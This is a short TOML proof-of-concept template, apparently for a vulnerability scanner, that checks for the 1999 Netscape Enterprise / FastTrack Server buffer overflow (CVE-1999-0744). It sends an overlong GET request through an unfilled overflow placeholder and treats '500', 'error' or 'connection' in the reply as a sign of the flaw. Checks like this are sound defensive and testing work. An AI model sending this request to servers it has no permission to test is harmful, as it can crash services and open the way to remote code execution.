[info]
author = "ave"
description = "通过发送超长的 HTTP GET 请求触发 Netscape Enterprise Server 3.6 SP2 / FastTrack Server 2.0.1 的缓冲区溢出，验证服务器是否存在该漏洞。当 URI 长度超过 4080 字节时，服务器 httpd.exe 进程将发生栈溢出崩溃（Dr. Watson 错误），攻击者可借此远程执行任意代码并提升权限。"
id = "POC-AVE-1999-0365"
name = "CVE-1999-0744 PoC"
severity = "high"
tags = ["ave-1999-0365"]
vuln_id = [
    "CVE-1999-0744",
    "AVE-1999-0365",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{overflow}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "error",
    "connection",
]
